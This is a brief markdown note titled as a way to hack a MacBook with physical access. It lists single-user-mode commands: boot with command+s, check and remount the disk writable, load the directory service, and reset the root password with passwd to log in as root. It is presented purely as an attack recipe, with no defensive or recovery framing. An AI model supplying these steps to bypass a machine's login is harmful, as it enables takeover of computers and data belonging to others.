#Hack MacBook with Physical access##

##Reboot##
```command+s```
```/sbin/fsck -fy```
```/sbin/mount -uw/```
```launchctl load /System/Library/LaunchDaemons/com.apple.opendirectoryd.plist```
```passwd```
##Login as root using new Password##
